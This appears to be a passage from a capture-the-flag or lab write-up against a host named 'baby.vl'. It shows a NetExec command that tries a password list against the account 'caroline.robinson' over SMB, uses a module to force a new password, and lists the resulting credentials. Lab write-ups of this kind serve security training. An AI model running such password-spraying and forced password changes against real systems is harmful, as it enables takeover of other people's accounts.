
the output provided me the information that users "caroline.robinson" password must be changed.

nxc has an in-built module which allows us to change the password of an user. I utilized this module to change the password.

```
nxc smb baby.vl -u caroline.robinson -p passwords.txt -M change-password -o NEWPASS=Warrior32
```

Our new credentials should be:

```
caroline.robinson:Warrior32
```